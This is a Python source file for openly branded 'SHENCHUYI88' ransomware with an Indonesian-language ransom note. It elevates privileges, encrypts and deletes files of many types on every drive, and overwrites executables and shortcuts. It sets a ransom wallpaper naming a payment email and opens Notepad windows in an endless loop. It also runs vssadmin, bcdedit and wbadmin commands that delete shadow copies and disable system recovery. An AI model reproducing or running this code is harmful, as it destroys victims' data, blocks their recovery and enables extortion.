import os
import sys
import ctypes
import shutil
import random
import string
import subprocess
from cryptography.fernet import Fernet
from pathlib import Path

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

if not is_admin():
    elevate()

key = Fernet.generate_key()
cipher = Fernet(key)

with open("key_enc.txt", "wb") as kf:
    kf.write(key)

target_extensions = [
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif',
    '.mp3', '.mp4', '.avi', '.mov', '.mkv', '.zip', '.rar', '.7z', '.exe', '.dll', '.sys', '.msi', '.py', '.c', '.cpp',
    '.java', '.js', '.html', '.css', '.php', '.asp', '.aspx', '.jsp', '.rb', '.go', '.swift', '.db', '.sql', '.mdb',
    '.accdb', '.vhd', '.vhdx', '.iso', '.img', '.bak', '.old', '.log', '.cfg', '.conf', '.ini', '.reg', '.ps1', '.vbs'
]

drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]

def encrypt_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(filepath + '.SHENCHUYI88', 'wb') as f:
            f.write(encrypted)
        os.remove(filepath)
    except:
        pass

def walk_and_encrypt():
    for drive in drives:
        for root, dirs, files in os.walk(drive):
            for file in files:
                filepath = os.path.join(root, file)
                if os.path.splitext(filepath)[1] in target_extensions:
                    encrypt_file(filepath)

def change_wallpaper():
    wallpaper_path = os.path.join(os.environ['TEMP'], 'wallpaper.jpg')
    from PIL import Image, ImageDraw, ImageFont
    img = Image.new('RGB', (1920, 1080), color='black')
    d = ImageDraw.Draw(img)
    d.text((100, 500), "SEMUA FILE ANDA TELAH DIENKRIPSI OLEH SHENCHUYI88 RANSOMWARE", fill=(255,0,0))
    d.text((100, 600), "BAYAR 10 JUTA RUPIAH KE EMAIL: fatcatfatcat63@gmail.com", fill=(255,255,255))
    img.save(wallpaper_path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)

def change_icons():
    target_dirs = [os.environ['ProgramFiles'], os.environ['ProgramFiles(x86)'], os.environ['USERPROFILE'] + '\\Desktop']
    for d in target_dirs:
        for root, dirs, files in os.walk(d):
            for f in files:
                if f.endswith('.exe') or f.endswith('.lnk'):
                    try:
                        icon_path = os.path.join(root, f)
                        with open(icon_path, 'r+b') as icon_file:
                            icon_file.write(b'SHENCHUYI88 ENCRYPTED')
                    except:
                        pass

def notepad_spam():
    for i in range(100):
        subprocess.Popen(['notepad.exe'])
        time.sleep(0.05)

def show_ransom_note():
    note = """
    ===============================================
    SEMUA FILE ANDA TELAH DIENKRIPSI!
    ===============================================
    Semua file penting Anda telah dienkripsi dengan algoritma AES-256.
    Untuk mengembalikan file Anda, Anda harus membayar tebusan sebesar:
    10 JUTA RUPIAH

    Hubungi kami di email: fatcatfatcat63@gmail.com
    Setelah pembayaran, Anda akan menerima kunci dekripsi.

    Jangan coba-coba memulihkan sendiri! Data Anda akan hilang selamanya.

    ===============================================
    SHENCHUYI88 RANSOMWARE - LOCKBIT STYLE
    ===============================================
    """
    with open("README_SHENCHUYI88.txt", "w") as f:
        f.write(note)
    os.startfile("README_SHENCHUYI88.txt")

def disable_recovery():
    try:
        os.system('vssadmin delete shadows /all /quiet')
        os.system('bcdedit /set {default} recoveryenabled No')
        os.system('bcdedit /set {default} bootstatuspolicy ignoreallfailures')
        os.system('wbadmin delete catalog -quiet')
    except:
        pass

def main():
    walk_and_encrypt()
    change_wallpaper()
    change_icons()
    notepad_spam()
    show_ransom_note()
    disable_recovery()
    
    while True:
        subprocess.Popen(['notepad.exe'])
        time.sleep(0.1)

if __name__ == "__main__":
    import time
    main()